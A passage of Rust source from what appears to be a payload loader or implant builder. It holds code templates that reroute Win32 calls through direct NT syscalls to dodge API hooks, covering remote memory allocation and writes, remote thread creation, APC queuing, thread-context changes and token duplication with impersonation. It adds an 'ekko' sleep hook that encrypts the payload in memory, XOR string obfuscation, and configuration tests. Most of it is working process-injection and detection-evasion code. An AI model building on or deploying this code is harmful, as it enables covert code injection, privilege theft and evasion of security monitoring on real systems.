    /// those come back through `RtlNtStatusToDosError`.
    extern "system" fn $ID$(desired_access: u32, inherit: i32, process_id: u32) -> isize {
        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: *mut core::ffi::c_void,
            object_name: *const core::ffi::c_void,
            attributes: u32,
            security_descriptor: *const core::ffi::c_void,
            security_quality_of_service: *const core::ffi::c_void,
        }
        #[repr(C)]
        struct ClientId {
            unique_process: *mut core::ffi::c_void,
            unique_thread: *mut core::ffi::c_void,
        }

        const OBJ_INHERIT: u32 = 0x0000_0002;
        let attributes = ObjectAttributes {
            length: core::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: core::ptr::null_mut(),
            object_name: core::ptr::null(),
            attributes: if inherit != 0 { OBJ_INHERIT } else { 0 },
            security_descriptor: core::ptr::null(),
            security_quality_of_service: core::ptr::null(),
        };
        let client_id = ClientId {
            unique_process: process_id as usize as *mut core::ffi::c_void,
            unique_thread: core::ptr::null_mut(),
        };
        let mut handle: isize = 0;
        let status = crate::nt_open_process(
            &mut handle as *mut isize as *mut core::ffi::c_void,
            desired_access,
            &attributes as *const ObjectAttributes as *const core::ffi::c_void,
            &client_id as *const ClientId as *const core::ffi::c_void,
        );
        if status >= 0 {
            return handle;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const WRAPPER_VIRTUAL_ALLOC_EX: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtAllocateVirtualMemory
    /// (NTSTATUS -> base pointer, `GetLastError` preserved).
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        address: *mut core::ffi::c_void,
        size: usize,
        alloc_type: u32,
        protect: u32,
    ) -> *mut core::ffi::c_void {
        let mut base = address;
        let mut region = size;
        let status = crate::nt_alloc_vm(process, &mut base, 0, &mut region, alloc_type, protect);
        if status >= 0 {
            return base;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        core::ptr::null_mut()
    }
"#;

const WRAPPER_WRITE_PROCESS_MEMORY: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtWriteVirtualMemory
    /// (NTSTATUS -> BOOL, `GetLastError` preserved, count kept).
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        base: *const core::ffi::c_void,
        buffer: *const core::ffi::c_void,
        size: usize,
        written: *mut usize,
    ) -> i32 {
        let status = crate::nt_write_vm(process, base, buffer, size, written);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const WRAPPER_VIRTUAL_PROTECT_EX: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtProtectVirtualMemory
    /// (NTSTATUS -> BOOL, `GetLastError` preserved, old protection kept).
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        base: *mut core::ffi::c_void,
        size: usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        let status = crate::nt_protect_vm(process, base, size, new_protect, old_protect);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const REBUILD_CREATE_REMOTE_THREAD: &str = r#"    /// $COMMENT$: rebuilt on NtCreateThreadEx (`CREATE_SUSPENDED` translated to
    /// the native flag). `lpThreadAttributes` and `lpThreadId` are not honored:
    /// the native call takes no security attributes and returns no thread id.
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        _attributes: *const core::ffi::c_void,
        stack_size: usize,
        start: *mut core::ffi::c_void,
        parameter: *mut core::ffi::c_void,
        creation_flags: u32,
        _thread_id: *mut u32,
    ) -> isize {
        const WIN32_CREATE_SUSPENDED: u32 = 0x0000_0004;
        const THREAD_CREATE_FLAGS_CREATE_SUSPENDED: u32 = 0x0000_0001;
        const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;

        let flags = if creation_flags & WIN32_CREATE_SUSPENDED != 0 {
            THREAD_CREATE_FLAGS_CREATE_SUSPENDED
        } else {
            0
        };
        let mut handle: isize = 0;
        let status = crate::nt_create_thread_ex_native(
            &mut handle as *mut isize as *mut windows::Win32::Foundation::HANDLE,
            THREAD_ALL_ACCESS,
            core::ptr::null(),
            process,
            start,
            parameter,
            flags,
            0,
            stack_size,
            0,
            core::ptr::null(),
        );
        if status >= 0 {
            return handle;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const WRAPPER_QUEUE_USER_APC: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtQueueApcThread
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(
        routine: *const core::ffi::c_void,
        thread: windows::Win32::Foundation::HANDLE,
        data: usize,
    ) -> u32 {
        let status = crate::nt_queue_apc(
            thread,
            routine,
            data as *mut core::ffi::c_void,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        );
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const WRAPPER_RESUME_THREAD: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtResumeThread (NTSTATUS ->
    /// previous suspend count, `GetLastError` preserved).
    extern "system" fn $ID$(thread: windows::Win32::Foundation::HANDLE) -> u32 {
        let mut previous = 0u32;
        let status = crate::nt_resume_thread(thread, &mut previous);
        if status >= 0 {
            return previous;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        u32::MAX
    }
"#;

const WRAPPER_SUSPEND_THREAD: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtSuspendThread (NTSTATUS ->
    /// previous suspend count, `GetLastError` preserved).
    extern "system" fn $ID$(thread: windows::Win32::Foundation::HANDLE) -> u32 {
        let mut previous = 0u32;
        let status = crate::nt_suspend_thread(thread, &mut previous);
        if status >= 0 {
            return previous;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        u32::MAX
    }
"#;

const WRAPPER_GET_THREAD_CONTEXT: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtGetContextThread
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(
        thread: windows::Win32::Foundation::HANDLE,
        context: *mut core::ffi::c_void,
    ) -> i32 {
        let status = crate::nt_get_context_thread(thread, context);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const WRAPPER_SET_THREAD_CONTEXT: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtSetContextThread
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(
        thread: windows::Win32::Foundation::HANDLE,
        context: *mut core::ffi::c_void,
    ) -> i32 {
        let status = crate::nt_set_context_thread(thread, context);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const WRAPPER_OPEN_PROCESS_TOKEN: &str = r#"    /// $COMMENT$: rebuilt on NtOpenProcessToken (the Win32 wrapper adds no
    /// object attributes; NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        desired_access: u32,
        token: *mut core::ffi::c_void,
    ) -> i32 {
        let status = crate::nt_open_process_token(process, desired_access, token);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const WRAPPER_DUPLICATE_TOKEN_EX: &str = r#"    /// $COMMENT$: rebuilt on NtDuplicateToken. `lpTokenAttributes` is ignored
    /// (the native call takes `OBJECT_ATTRIBUTES`, not `SECURITY_ATTRIBUTES`),
    /// and so is the requested impersonation level: the native fourth argument
    /// is `EffectiveOnly`, which is passed as 0 so the duplicate is not filtered.
    /// The token type passes through unchanged (same enum values).
    extern "system" fn $ID$(
        existing: windows::Win32::Foundation::HANDLE,
        desired_access: u32,
        _attributes: *const core::ffi::c_void,
        _impersonation_level: i32,
        token_type: i32,
        new_token: *mut core::ffi::c_void,
    ) -> i32 {
        let status = crate::nt_duplicate_token(
            existing,
            desired_access,
            core::ptr::null(),
            0,
            token_type,
            new_token,
        );
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const WRAPPER_IMPERSONATE_LOGGED_ON_USER: &str = r#"    /// $COMMENT$: rebuilt on NtSetInformationThread(ThreadImpersonationToken),
    /// the native shape of ImpersonateLoggedOnUser (NTSTATUS -> BOOL).
    extern "system" fn $ID$(token: windows::Win32::Foundation::HANDLE) -> i32 {
        const THREAD_IMPERSONATION_TOKEN: i32 = 5;

        let status = crate::nt_set_info_thread(
            unsafe { windows::Win32::System::Threading::GetCurrentThread() },
            THREAD_IMPERSONATION_TOKEN,
            &token as *const windows::Win32::Foundation::HANDLE as *const core::ffi::c_void,
            core::mem::size_of::<windows::Win32::Foundation::HANDLE>() as u32,
        );
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const HANDLER_TEMPLATE: &str = r#"    /// $COMMENT$: decides what to return. Catalogue hits get their proxy,
    /// everything else (including ordinals) is forwarded to the original.
    extern "system" fn $PROXY$(module: isize, name: *const u8) -> isize {
        unsafe {
            // A name pointer with a zero high word is an ordinal: forward it.
            if (name as usize) >> 16 != 0 {
                let wanted = std::ffi::CStr::from_ptr(name as *const i8);
                if let Ok(func) = wanted.to_str() {
                    let mut buf = [0u8; 260];
                    let len = windows::Win32::System::LibraryLoader::GetModuleFileNameA(
                        windows::Win32::Foundation::HMODULE(module as *mut core::ffi::c_void),
                        &mut buf,
                    );
                    if len > 0 {
                        let path = String::from_utf8_lossy(&buf[..len as usize]);
                        if let crate::ImportPolicy::Proxy(proxy) = resolution_policy(&path, func) {
                            return proxy as isize;
                        }
                    }
                }
            }
            let target: extern "system" fn(isize, *const u8) -> isize =
                core::mem::transmute($ORIGINAL$());
            target(module, name)
        }
    }

    /// Resolves the original export once.
    fn $ORIGINAL$() -> usize {
        static ORIGINAL: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        *ORIGINAL.get_or_init(|| unsafe {
            let want_dll: String = $DLL_DEF$;
            let want_func: String = $FUNC_DEF$;
            let (Ok(dll), Ok(func)) =
                (std::ffi::CString::new(want_dll), std::ffi::CString::new(want_func))
            else {
                return 0;
            };
            let Ok(module) = windows::Win32::System::LibraryLoader::GetModuleHandleA(
                windows::core::PCSTR(dll.as_ptr() as *const u8),
            ) else {
                return 0;
            };
            match windows::Win32::System::LibraryLoader::GetProcAddress(
                module,
                windows::core::PCSTR(func.as_ptr() as *const u8),
            ) {
                Some(address) => address as usize,
                None => 0,
            }
        })
    }
"#;

const FORWARD_TEMPLATE: &str = r#"    /// $COMMENT$: forwards to the original export, resolved at runtime (the
    /// intercepted name is never imported).
    extern "system" fn $PROXY$($PARAMS$) -> $RET$ {
        let original = $ORIGINAL$();
        let target: extern "system" fn($TYPES$) -> $RET$ =
            unsafe { core::mem::transmute(original) };
        target($ARGS$)
    }

    /// Resolves the original export once.
    fn $ORIGINAL$() -> usize {
        static ORIGINAL: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        *ORIGINAL.get_or_init(|| unsafe {
            let want_dll: String = $DLL_DEF$;
            let want_func: String = $FUNC_DEF$;
            let (Ok(dll), Ok(func)) =
                (std::ffi::CString::new(want_dll), std::ffi::CString::new(want_func))
            else {
                return 0;
            };
            let Ok(module) = windows::Win32::System::LibraryLoader::GetModuleHandleA(
                windows::core::PCSTR(dll.as_ptr() as *const u8),
            ) else {
                return 0;
            };
            match windows::Win32::System::LibraryLoader::GetProcAddress(
                module,
                windows::core::PCSTR(func.as_ptr() as *const u8),
            ) {
                Some(address) => address as usize,
                None => 0,
            }
        })
    }
"#;

const WRAPPER_VIRTUAL_ALLOC: &str = r#"    /// $COMMENT$: rebuilt on NtAllocateVirtualMemory for the current process.
    ///
    /// `VirtualAlloc` takes the current process implicitly, so the proxy passes
    /// the `(HANDLE)-1` pseudo-handle. `address` stays a hint: the native call
    /// honours a free region there or picks another one, as Win32 does.
    extern "system" fn $ID$(
        address: *mut core::ffi::c_void,
        size: usize,
        alloc_type: u32,
        protect: u32,
    ) -> *mut core::ffi::c_void {
        let mut base = address;
        let mut region = size;
        let status = crate::nt_alloc_vm(
            current_process(),
            &mut base,
            0,
            &mut region,
            alloc_type,
            protect,
        );
        if status >= 0 {
            return base;
        }
        set_last_error(status);
        core::ptr::null_mut()
    }
"#;

const WRAPPER_VIRTUAL_PROTECT: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtProtectVirtualMemory
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(
        address: *const core::ffi::c_void,
        size: usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        let status = crate::nt_protect_vm(
            current_process(),
            address as *mut core::ffi::c_void,
            size,
            new_protect,
            old_protect,
        );
        if status >= 0 {
            return 1;
        }
        set_last_error(status);
        0
    }
"#;

const WRAPPER_VIRTUAL_FREE: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtFreeVirtualMemory
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    ///
    /// `MEM_RELEASE` still requires `size == 0`; the proxy passes both values
    /// through unchanged so the kernel enforces the same contract.
    extern "system" fn $ID$(
        address: *mut core::ffi::c_void,
        size: usize,
        free_type: u32,
    ) -> i32 {
        let mut base = address;
        let mut region = size;
        let status = crate::nt_free_vm(current_process(), &mut base, &mut region, free_type);
        if status >= 0 {
            return 1;
        }
        set_last_error(status);
        0
    }
"#;

const WRAPPER_CLOSE_HANDLE: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtClose
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(handle: windows::Win32::Foundation::HANDLE) -> i32 {
        let status = crate::nt_close(handle);
        if status >= 0 {
            return 1;
        }
        set_last_error(status);
        0
    }
"#;

const WRAPPER_WAIT_FOR_SINGLE_OBJECT: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtWaitForSingleObject
    /// (relative timeout in 100 ns units, `WAIT_*` results preserved).
    ///
    /// `INFINITE` becomes a null timeout. `STATUS_WAIT_0` and `STATUS_TIMEOUT`
    /// share their values with `WAIT_OBJECT_0` and `WAIT_TIMEOUT`, so a success
    /// status is returned unchanged; a failure becomes `WAIT_FAILED` with the
    /// translated Win32 error.
    extern "system" fn $ID$(
        handle: windows::Win32::Foundation::HANDLE,
        milliseconds: u32,
    ) -> u32 {
        let timeout: i64 = if milliseconds == u32::MAX {
            0
        } else {
            -((milliseconds as i64) * 10_000)
        };
        let timeout_ptr: *const i64 = if milliseconds == u32::MAX {
            core::ptr::null()
        } else {
            &timeout as *const i64
        };
        let status = crate::nt_wait_for_single_object_native(handle, 0, timeout_ptr);
        if status >= 0 {
            return status as u32;
        }
        set_last_error(status);
        0xFFFF_FFFF
    }
"#;

const WRAPPER_VIRTUAL_QUERY: &str = r#"    /// $COMMENT$: rebuilt on NtQueryVirtualMemory(MemoryBasicInformation) for
    /// the current process. The native class-0 structure is the Win32
    /// `MEMORY_BASIC_INFORMATION`.
    extern "system" fn $ID$(
        address: *const core::ffi::c_void,
        buffer: *mut windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION,
        length: usize,
    ) -> usize {
        let mut returned = 0usize;
        let status = crate::nt_query_vm(
            current_process(),
            address,
            0,
            buffer as *mut core::ffi::c_void,
            length,
            &mut returned as *mut usize,
        );
        if status >= 0 {
            return returned;
        }
        set_last_error(status);
        0
    }
"#;

const WRAPPER_CREATE_THREAD: &str = r#"    /// $COMMENT$: rebuilt on NtCreateThreadEx for the current process.
    ///
    /// `lpThreadAttributes` is ignored (the native call takes no security
    /// attributes) and `STACK_SIZE_PARAM_IS_A_RESERVATION` is not honoured:
    /// `stack_size` always becomes the initial stack. `CREATE_SUSPENDED` maps to
    /// `THREAD_CREATE_FLAGS_CREATE_SUSPENDED`. `lpThreadId`, when non-null, is
    /// filled from `ThreadBasicInformation`, because the native call returns no
    /// thread id.
    extern "system" fn $ID$(
        thread_attributes: *const core::ffi::c_void,
        stack_size: usize,
        start: *mut core::ffi::c_void,
        parameter: *mut core::ffi::c_void,
        creation_flags: u32,
        thread_id: *mut u32,
    ) -> windows::Win32::Foundation::HANDLE {
        const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
        const CREATE_SUSPENDED: u32 = 0x0000_0004;
        const THREAD_CREATE_FLAGS_CREATE_SUSPENDED: u32 = 0x0000_0001;

        let _ = thread_attributes;
        let mut handle = windows::Win32::Foundation::HANDLE(core::ptr::null_mut());
        let flags = if creation_flags & CREATE_SUSPENDED != 0 {
            THREAD_CREATE_FLAGS_CREATE_SUSPENDED
        } else {
            0
        };
        let status = crate::nt_create_thread_ex_native(
            &mut handle,
            THREAD_ALL_ACCESS,
            core::ptr::null(),
            current_process(),
            start,
            parameter,
            flags,
            0,
            stack_size,
            0,
            core::ptr::null(),
        );
        if status < 0 {
            set_last_error(status);
            return windows::Win32::Foundation::HANDLE(core::ptr::null_mut());
        }
        if !thread_id.is_null() {
            #[repr(C)]
            struct ClientId {
                unique_process: *mut core::ffi::c_void,
                unique_thread: *mut core::ffi::c_void,
            }
            #[repr(C)]
            struct ThreadBasicInformation {
                exit_status: i32,
                teb_base: *mut core::ffi::c_void,
                client_id: ClientId,
                affinity_mask: usize,
                priority: i32,
                base_priority: i32,
            }
            let mut info = ThreadBasicInformation {
                exit_status: 0,
                teb_base: core::ptr::null_mut(),
                client_id: ClientId {
                    unique_process: core::ptr::null_mut(),
                    unique_thread: core::ptr::null_mut(),
                },
                affinity_mask: 0,
                priority: 0,
                base_priority: 0,
            };
            let mut returned = 0u32;
            let query = crate::nt_query_info_thread(
                handle,
                0,
                &mut info as *mut ThreadBasicInformation as *mut core::ffi::c_void,
                core::mem::size_of::<ThreadBasicInformation>() as u32,
                &mut returned,
            );
            if query >= 0 {
                unsafe {
                    *thread_id = info.client_id.unique_thread as usize as u32;
                }
            }
        }
        handle
    }
"#;

const WRAPPER_OPEN_THREAD_TOKEN: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtOpenThreadToken
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(
        thread: windows::Win32::Foundation::HANDLE,
        access: u32,
        open_as_self: i32,
        token: *mut windows::Win32::Foundation::HANDLE,
    ) -> i32 {
        let status = crate::nt_open_thread_token(
            thread,
            access,
            (open_as_self != 0) as u8,
            token as *mut core::ffi::c_void,
        );
        if status >= 0 {
            return 1;
        }
        set_last_error(status);
        0
    }
"#;

const SLEEP_HOOK: &str = r#"    /// $COMMENT$: encrypts the mapped payload while it sleeps.
    ///
    /// Every path that does not obfuscate (a short sleep, `INFINITE`, no
    /// recorded region, a concurrent obfuscated sleep, or an ekko setup
    /// failure) degrades to a real `NtDelayExecution` delay, so the payload
    /// keeps the Win32 contract either way.
    extern "system" fn $ID$(milliseconds: u32) {
        use core::sync::atomic::{AtomicBool, Ordering};

        /// One ekko chain at a time: the chain is not reentrant.
        static CONCEALING: AtomicBool = AtomicBool::new(false);
        const MIN_MS: u32 = $MIN_MS$;
        const MAX_MS: u32 = $MAX_MS$;
        const INFINITE: u32 = 0xFFFF_FFFF;

        fn delay(milliseconds: u32) {
            if milliseconds == INFINITE {
                unsafe {
                    crate::nt_delay_execution(0, core::ptr::null());
                }
                return;
            }
            let timeout: i64 = -((milliseconds as i64) * 10_000);
            unsafe {
                crate::nt_delay_execution(0, &timeout as *const i64);
            }
        }

        if milliseconds == 0
            || milliseconds == INFINITE
            || milliseconds < MIN_MS
            || milliseconds > MAX_MS
        {
            delay(milliseconds);
            return;
        }
        let Some((base, size)) = crate::payload_region::get() else {
            delay(milliseconds);
            return;
        };
        if CONCEALING
            .compare_exchange(false, true, Ordering::AcqRel, Ordering::Acquire)
            .is_err()
        {
            delay(milliseconds);
            return;
        }
        let result = crate::sleep_runtime::ekko_sleep(base, size, milliseconds);
        CONCEALING.store(false, Ordering::Release);
        if result.is_err() {
            delay(milliseconds);
        } else {
            crate::payload_region::record_conceal();
        }
    }
"#;

#[cfg(test)]
mod tests {
    use super::*;

    fn yaml(s: &str) -> YamlApiResolutionPlan {
        serde_yml::from_str(s).expect("valid YAML")
    }

    #[test]
    fn absent_block_defaults_to_none_and_is_a_noop() {
        let config = ApiResolutionConfig::from_yaml(None).expect("defaults");
        assert_eq!(config.mode, ApiResolutionMode::None);
        assert_eq!(config.unmatched, Unmatched::Forward);
        assert!(config.apis.is_empty());
        assert!(config.is_noop());
    }

    #[test]
    fn yaml_defaults_are_none_and_forward() {
        let config = ApiResolutionConfig::from_yaml(Some(&yaml("{}"))).expect("defaults");
        assert_eq!(config.mode, ApiResolutionMode::None);
        assert_eq!(config.unmatched, Unmatched::Forward);
    }

    #[test]
    fn parses_proxy_with_catalogue_apis() {
        let y = yaml(
            "mode: proxy\napis:\n  - \"kernel32!ReadProcessMemory\"\n  - \"ntdll!NtOpenProcess\"\nunmatched: abort\n",
        );
        let config = ApiResolutionConfig::from_yaml(Some(&y)).expect("valid");
        assert_eq!(config.mode, ApiResolutionMode::Proxy);
        assert_eq!(config.unmatched, Unmatched::Abort);
        assert_eq!(config.apis.len(), 2);
        assert_eq!(config.apis[0].func, "ReadProcessMemory");
        assert_eq!(config.apis[1].func, "NtOpenProcess");
        assert!(!config.is_noop());
    }

    #[test]
    fn apis_all_selects_the_catalogue_and_every_direct_nt_route() {
        // Bare scalar form.
        let config =
            ApiResolutionConfig::from_yaml(Some(&yaml("mode: proxy\napis: all\n"))).expect("valid");
        for entry in CATALOGUE {
            assert!(
                config.apis.iter().any(|e| e == entry),
                "missing {}",
                entry.selector()
            );
        }
        for name in crate::engine::syscalls::nt_proxy_names() {
            assert!(
                config
                    .apis
                    .iter()
                    .any(|e| e.dll == "ntdll" && e.func == name),
                "missing ntdll!{name}"
            );
        }
        // Deduplicated: the two Nt* the catalogue already lists appear once.
        let mut expected: Vec<String> = CATALOGUE.iter().map(ApiEntry::selector).collect();
        for name in crate::engine::syscalls::nt_proxy_names() {
            let selector = format!("ntdll!{name}");
            if !expected.contains(&selector) {
                expected.push(selector);
            }
        }
        assert_eq!(config.apis.len(), expected.len());
        assert!(!config.is_noop());

        // List form is equivalent.
        let config = ApiResolutionConfig::from_yaml(Some(&yaml("mode: proxy\napis:\n  - all\n")))
            .expect("valid");
        assert_eq!(config.apis.len(), expected.len());
    }

    /// `ntdll:*` selects every direct `Nt*` route the syscall layer can serve,
    /// and only those (the helper-backed ones).
    #[test]
    fn ntdll_wildcard_selects_every_direct_route() {
        let direct = crate::engine::syscalls::nt_proxy_names();
        let config =
            ApiResolutionConfig::from_yaml(Some(&yaml("mode: proxy\napis: \"ntdll:*\"\n")))
                .expect("valid");
        assert_eq!(config.apis.len(), direct.len());
        assert!(config
            .apis
            .iter()
            .all(|e| e.dll == "ntdll" && e.strategy == Strategy::RouteToNt));
        assert!(config.apis.iter().any(|e| e.func == "NtClose"));
        // Every syscall-layer function is offered now, the convenience-backed
        // ones included.
        assert!(config.apis.iter().any(|e| e.func == "NtCreateThreadEx"));
        assert!(config
            .apis
            .iter()
            .any(|e| e.func == "NtWaitForSingleObject"));
        // Every selected route pulls its syscall helper.
        assert_eq!(config.required_syscalls().len(), direct.len());
    }

    /// A direct `ntdll!Nt*` route renders a generated `extern "system"` proxy
    /// that forwards to the syscall-layer helper.
    #[test]
    fn a_direct_nt_route_renders_a_generated_proxy() {
        let config = proxy_config(&["ntdll!NtClose"]);
        let block = render_block(&config, &xor_strings());
        assert!(block.contains("extern \"system\" fn proxy_0"), "{block}");
        assert!(block.contains("crate::nt_close(handle)"), "{block}");
        // Proxies must never trace: they run on payload threads too, where the
        // stub's thread-locals are not provisioned (a debug `eprintln!` there
        // reads garbage through the stub's TLS index and faults).
        assert!(!block.contains("tech_dbg"), "proxy traces: {block}");
        assert!(!block.contains('$'), "leftover placeholder: {block}");
    }

    #[test]
    fn api_accepts_a_bare_scalar_selector() {
        let config = ApiResolutionConfig::from_yaml(Some(&yaml(
            "mode: proxy\napis: \"kernel32!OpenProcess\"\n",
        )))
        .expect("valid");
        assert_eq!(config.apis.len(), 1);
        assert_eq!(config.apis[0].func, "OpenProcess");
    }

    #[test]
    fn module_name_is_normalized() {
        let y = yaml(
            "mode: proxy\napis:\n  - \"KERNEL32.DLL!ReadProcessMemory\"\n  - \"C:/Windows/System32/ntdll!NtReadVirtualMemory\"\n",
        );
        let config = ApiResolutionConfig::from_yaml(Some(&y)).expect("valid");
        assert_eq!(config.apis.len(), 2);
        assert_eq!(config.apis[0].func, "ReadProcessMemory");
        assert_eq!(config.apis[1].func, "NtReadVirtualMemory");
    }

    #[test]
    fn repeated_apis_are_deduplicated() {
        let y = yaml(
            "mode: proxy\napis:\n  - \"kernel32!ReadProcessMemory\"\n  - \"KERNEL32!ReadProcessMemory\"\n",
        );
        let config = ApiResolutionConfig::from_yaml(Some(&y)).expect("valid");
        assert_eq!(config.apis.len(), 1);
    }

    #[test]
    fn a_proxy_with_no_apis_is_a_noop() {
        let y = yaml("mode: proxy\n");
        let config = ApiResolutionConfig::from_yaml(Some(&y)).expect("valid");
        assert!(config.is_noop());
    }

    #[test]
    fn rejects_an_unknown_mode() {
        let y = yaml("mode: intercept\n");
        let err = ApiResolutionConfig::from_yaml(Some(&y)).expect_err("unknown mode");
        assert!(
            err.to_string().contains("api_resolution.mode"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_an_unknown_unmatched() {
        let y = yaml("mode: proxy\nunmatched: deny\n");
        let err = ApiResolutionConfig::from_yaml(Some(&y)).expect_err("unknown unmatched");
        assert!(
            err.to_string().contains("api_resolution.unmatched"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_an_api_outside_the_catalogue() {
        let y = yaml("mode: proxy\napis:\n  - \"kernel32!Nope\"\n");
        let err = ApiResolutionConfig::from_yaml(Some(&y)).expect_err("unknown api");
        assert!(
            err.to_string().contains("api_resolution.apis"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_a_selector_without_a_module() {
        let y = yaml("mode: proxy\napis:\n  - \"ReadProcessMemory\"\n");
        let err = ApiResolutionConfig::from_yaml(Some(&y)).expect_err("malformed selector");
        assert!(
            err.to_string().contains("api_resolution.apis"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn selectors_are_unique_and_well_formed() {
        let mut seen = std::collections::BTreeSet::new();
        for entry in CATALOGUE {
            assert!(!entry.dll.is_empty());
            assert!(!entry.func.is_empty());
            assert_eq!(
                entry.dll,
                normalize_module(entry.dll),
                "catalogue dll must be pre-normalized"
            );
            assert!(seen.insert(entry.selector()), "duplicate selector");
            if entry.strategy == Strategy::RouteToNt {
                assert!(
                    entry.nt.is_some(),
                    "{} needs an Nt* target",
                    entry.selector()
                );
            }
        }
    }

    fn xor_strings() -> StringsConfig {
        StringsConfig {
            strategy: crate::engine::obfuscation::StringStrategy::Xor,
            key: Some([0x5Au8; 32]),
        }
    }

    fn proxy_config(apis: &[&str]) -> ApiResolutionConfig {
        let list: String = apis.iter().map(|a| format!("  - \"{a}\"\n")).collect();
        let y = yaml(&format!("mode: proxy\napis:\n{list}"));
        ApiResolutionConfig::from_yaml(Some(&y)).expect("valid")
    }

    fn proxy_config_with_unmatched(apis: &[&str], unmatched: &str) -> ApiResolutionConfig {
        let list: String = apis.iter().map(|a| format!("  - \"{a}\"\n")).collect();
